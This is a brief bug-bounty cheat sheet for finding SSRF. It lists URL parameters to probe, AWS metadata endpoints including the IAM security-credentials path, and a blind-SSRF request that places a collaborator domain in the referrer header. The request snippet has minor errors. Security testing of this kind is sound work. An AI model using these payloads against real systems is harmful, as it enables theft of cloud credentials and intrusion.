##How To Find SSRF?
 
1. If you got Open Redirect try escalating it to SSRF.
2. gf SSRF to grep parameters may vulnerable to SSRF.
3. SSRF's are more in API's so crawl the whole web app with burp proxy turned on and search for keywords like., eg :

		?url=
		?uri=
		?req= 
        
4. Sign up with an Email like attacker.collaborator.net. If u receive HTTP req. in collaborator then its SSRF. But if there's no impact don't report it, DNS and SMTP request doesn't matters.

  
##AWS Metadata

1. AWS localhost is 169.254.169.254 so don't use 127.0.0.1 there!
2. If you found an SSRF vulnerability that runs on EC2, try requesting :

   	http://169.254.169.254/latest/meta-data/
	http://169.254.169.254/latest/user-data/
	http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
	http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

##Blind SSRF Tips

1. Try to find Blind SSRF on hidden parameter
2. Try Blind SSRF on referer header
          
One way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.

Snippet:

    GET /HTTP 1.1
    Host: site.com
    User Agent: Firefox
    Referrer: https://your_collaborator_instance.com
